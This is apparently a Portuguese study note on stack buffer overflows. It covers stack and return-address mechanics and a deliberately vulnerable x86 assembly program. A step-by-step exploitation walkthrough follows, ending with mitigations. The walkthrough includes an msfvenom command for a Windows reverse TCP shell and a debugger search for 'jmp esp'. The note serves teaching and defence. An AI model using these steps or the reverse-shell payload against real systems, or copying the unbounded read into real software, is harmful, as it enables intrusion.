**Buffer overflow** é uma [[7. Vulnerabilidade|vulnerabilidade]] em que o programa escreve mais bytes do que um buffer alocado originalmente comporta, invadindo memória que não deveria ter acesso. Acontece quando o código copia uma entrada para um buffer de tamanho fixo sem checar o tamanho dessa entrada. Na linguagem `C`, funções "inseguras" como `strcpy`, `strcat`, `gets` são muito suscetíveis a buffer overflow se não houver um tratamento prévio do input.

Este tipo de falha é vetor para [[7. Denial of Service|DoS]] e vulnerabilidades mais graves como [[7. Remote Code Execution|RCE]] e escalada de privilégios.
# Como funciona

Em baixo nível, variáveis locais são alocadas numa região de memória contínua chamada [stack](https://en.wikipedia.org/wiki/Stack_(abstract_data_type)) e isso é feito movendo o registrador `esp`, que aponta para o topo da pilha. Por exemplo, a instrução `sub esp, 16` move o `esp` em 16 bytes, alocando essa quantidade.

> [!NOTE] Stack "cresce" para baixo
> Em layouts de memória de sistemas modernos, a stack tende a ficar no topo da região de memória alocada para o processo, dessa forma inserir dados na stack faz com que o registrador `esp` se mova do maior endereço para o menor endereço.
> 
> Exemplo: se `esp` armazenar o endereço `0xabcdef04` e inserirmos 4 bytes com `push 0x10203040`, `esp` então passará a apontar para `0xabcdef00`. Remover algo da stack (com `pop` ou `add`) faz o caminho inverso, ou seja, incrementa `esp`.

Além de variáveis locais, também é inserido na stack o endereço de retorno quando funções são chamadas. Por exemplo, ao executar a instrução `call some_function`, o registrador `eip` (instruction pointer, que aponta para o endereço da próxima instrução) passa a apontar para o endereço de início de `some_function`. Contudo, de alguma forma, a aplicação precisa saber para onde retornar a execução quando `some_function` terminar. Para isso, uma chamada para `call` também insere na stack o endereço da instrução seguinte à `call`. Quando a função finalizar, ela chama `ret`, que remove este endereço na stack e insere em `eip`, fazendo com que o fluxo de execução volte para onde estava.

Com isso em mente, é possível construir um cenário em que um buffer overflow possa acontecer:

```c
STACK

0xABCDEF0B [      X     ] // endereço de retorno após `call A`
0xABCDEF0A [      ?     ] // `. <- fim do buffer
0xABCDEF09 [      ?     ] //  |
0xABCDEF08 [      ?     ] //  |
0xABCDEF07 [      ?     ] //  }- buffer de 8 bytes alocado
0xABCDEF06 [      ?     ] //  |
0xABCDEF05 [      ?     ] //  |
0xABCDEF04 [      ?     ] //  |
0xABCDEF03 [      ?     ] // ´  <- início do buffer
0xABCDEF02 [      Y     ] // endereço de retorno após `call B`
```

> [!NOTE] Diagrama simplificado
> Aqui cada célula vale 1 byte, mas um endereço de retorno ocupa 4 bytes em x86 (`X` e `Y` cairiam em 4 células). É só um exemplo pra ilustrar a ideia.

No exemplo acima, foi executada a instrução `call A`  que inseriu o endereço de retorno na stack (`X`). Após isso, a função `A` alocou 8 bytes na stack (endereço `0xABCDEF0A` até `0xABCDEF03`). Por fim, um `call B` foi executado, também inserindo o endereço de retorno na stack.

Agora, digamos que esta função `B` leia bytes de alguma entrada e armazene a partir do início do buffer alocado por `A` (dentre os 8 bytes alocados, o endereço de início do buffer é o menor nesta região, no caso, `0xABCDEF03`). Se `B` não limitar a quantidade de bytes lidos é possível que o valor no endereço `0xABCDEF0B` (endereço de retorno `X`) seja sobrescrito por qualquer outra coisa, digamos que por `Z`. Quando `B` terminar de executar ele retornará para a função `A` que por sua vez também tentará retornar, contudo seu endereço de retorno terá sido sobrescrito.

Desta forma, controlando o endereço de retorno da função `A`, um atacante pode desviar a execução para onde quiser, normalmente para um [[7. Payload|shellcode]] próprio que também pode ser injetado na stack.

O exemplo abaixo (x86, Linux) mostra a mesma ideia num código concreto: o `mock` faz o papel de `A` (reserva 8 bytes na pilha) e o `gets` faz o papel de `B`, lendo byte a byte de `stdin` até achar um `\n` sem nunca comparar com o tamanho do buffer. Qualquer entrada maior que 8 bytes vaza para a memória adjacente e sobrescreve o endereço de retorno de `mock`.

```asm
section data
    input_max_len: equ 8

section .text
    global _start

; lê de stdin com a syscall read até achar um newline.
; salva os bytes lidos a partir do endereço guardado em edi.
gets:
    xor ebp, ebp ; conta quantos bytes foram lidos
.loop_gets:

    ; syscall read
    mov eax, 3    ; sys_read
    mov ebx, 0    ; stdin
    mov ecx, edi  ; endereço de destino
    mov edx, 1    ; lê só 1 byte por chamada
    int 0x80

    ; checa se o byte recebido é 0xA (newline)
    cmp byte [edi], 0xA
    je .end_gets  ; se for, encerra o loop

    inc ebp
    inc edi       ; avança para o próximo endereço e salva o próximo byte
    jmp .loop_gets

.end_gets:
    mov byte [edi], 0 ; escreve um null byte para terminar a string
    ret

; função de exemplo que chama 'gets' (é aqui que o overflow acontece)
mock:
    sub esp, input_max_len ; reserva um buffer de 'input_max_len' bytes na pilha
    mov edi, esp           ; copia esp (base do buffer) para edi

    call gets              ; sem checagem de tamanho: entrada > 8 bytes vaza

    ; syscall write
    mov eax, 4
    mov ebx, 1
    mov ecx, esp
    mov edx, ebp
    int 0x80

    add esp, input_max_len ; libera o buffer da pilha
    ret

_start:
    call mock

    ; syscall exit
    mov eax, 1
    xor ebx, ebx
    int 0x80
```

# Explorando um stack buffer overflow

Fluxo clássico de exploração de um stack overflow (bem comum em serviço Windows x86 rodando um `.exe` num debugger, como [[1. x64dbg|x32dbg]]):

1. **Fuzzing:** Manda entradas cada vez maiores até o programa travar. Um monte de `A` (`\x41`) é o suficiente para confirmar o stack buffer overflow.
2. **Achar o offset do EIP:** Gera um padrão único com [[1. msf-pattern_create]], manda no lugar dos `A` e, quando trava, lê o valor que caiu no registrador `EIP`. Passa esse valor pro [[1. msf-pattern_offset]] pra descobrir em quantos bytes o `EIP` é sobrescrito. Esse é o offset exato até o endereço de retorno.
3. **Mapear os [[4. Bad Characters|bad characters]]:** Envia todos os bytes de `\x00` a `\xff` e compara na memória o que chegou íntegro. Byte que some ou corrompe a entrada não pode aparecer no payload.
4. **Achar um endereço de retorno:** Em vez de chutar o endereço da pilha (que pode mudar), procure uma instrução `jmp esp` (opcode `\xff\xe4`) num módulo sem proteção e usa o endereço dela como novo `EIP`. Quando o `ret` executa, o `jmp esp` pula pra pilha, onde está o shellcode.
5. **Gerar e injetar o shellcode:** Cria o payload com [[1. msfvenom]], já excluindo os bad characters, e monta a entrada final: `[padding até o offset]` + `[endereço do jmp esp]` + `[NOPs]` + `[shellcode]`. Exemplo: `msfvenom -p windows/shell_reverse_tcp -b "\x00\x0a" LHOST=<lhost> LPORT=<lport> EXITFUNC=thread -f c`

> [!tip] Procurando o `jmp esp` no debugger
> No x32dbg/x64dbg dá pra varrer um módulo atrás do opcode `\xff\xe4`:
> ```
> findallmem mod.base("nome_da_dll"), ffe4, mod.size("nome_da_dll")
> ```
> Escolha um endereço num módulo que não tenha ASLR/DEP e cujo endereço não contenha bad characters.

> [!blueteam] Mitigações modernas
> Proteções de compilador e de SO dificultam muito a exploração: **stack canary** (detecta sobrescrita da pilha antes do `ret`), **DEP/NX** (marca a pilha como não executável, bloqueia shellcode direto), **ASLR** (randomiza endereços) e **PIE**. Técnicas como ROP existem justamente pra contornar DEP/ASLR. Manter compilador, flags de hardening e o SO atualizados é o principal controle.
